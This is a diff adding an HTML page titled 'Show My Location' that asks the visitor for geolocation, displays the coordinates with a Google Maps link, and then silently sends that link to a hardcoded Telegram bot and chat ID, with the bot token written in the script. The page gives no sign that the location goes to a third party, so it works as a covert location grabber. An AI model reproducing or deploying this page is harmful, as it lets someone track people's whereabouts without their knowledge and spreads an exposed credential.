@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Show My Location</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 0;
+      padding: 20px;
+      background-color: #f4f4f4;
+    }
+
+    button {
+      margin-top: 15px;
+      padding: 10px 20px;
+      font-size: 16px;
+      color: #fff;
+      background-color: #007bff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    h1 {
+      margin-top: 20px;
+      color: #333;
+    }
+
+    a {
+      margin-top: 15px;
+      font-size: 16px;
+      color: #007bff;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+<h2>Find My Location</h2>
+<button onclick="getLocation()">Show My Location</button>
+<h1 id="locationDisplay"></h1>
+<a id="mapLink" target="_blank" style="display: none;">Open in Google Maps</a>
+
+<script>
+  // Replace with your actual bot token and chat ID
+  const botToken = "8078207166:AAG17JCKq3GPCgiXqamvplk5pDcLfBFwPFE";
+  const chatId = "509478224"; // Replace with your actual chat ID
+
+  function getLocation() {
+    const locationDisplay = document.getElementById("locationDisplay");
+    const mapLink = document.getElementById("mapLink");
+
+    // Check if Geolocation is supported
+    if (navigator.geolocation) {
+      // Request user's location with permission prompt
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+          
+          // Display location coordinates and Google Maps link
+          locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+          mapLink.href = googleMapsUrl;
+          mapLink.textContent = "Open in Google Maps";
+          mapLink.style.display = "inline";
+          
+          // Send location link to Telegram bot
+          sendToTelegram(googleMapsUrl);
+        },
+        (error) => {
+          // Handle location request denial or errors
+          if (error.code === error.PERMISSION_DENIED) {
+            locationDisplay.textContent = "Location access denied. Please allow location access to view your location.";
+          } else {
+            locationDisplay.textContent = "Unable to retrieve your location.";
+          }
+          mapLink.style.display = "none";
+        }
+      );
+    } else {
+      locationDisplay.textContent = "Geolocation is not supported by this browser.";
+      mapLink.style.display = "none";
+    }
+  }
+
+  function sendToTelegram(url) {
+    const message = `Here is my location: ${url}`;
+    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    // Send location data as message via POST request
+    fetch(telegramApiUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        console.log("Location sent to Telegram successfully.");
+      } else {
+        console.error("Failed to send location to Telegram:", data.description);
+      }
+    })
+    .catch(error => console.error("Error sending location to Telegram:", error));
+  }
+</script>
+
+</body>
+</html>
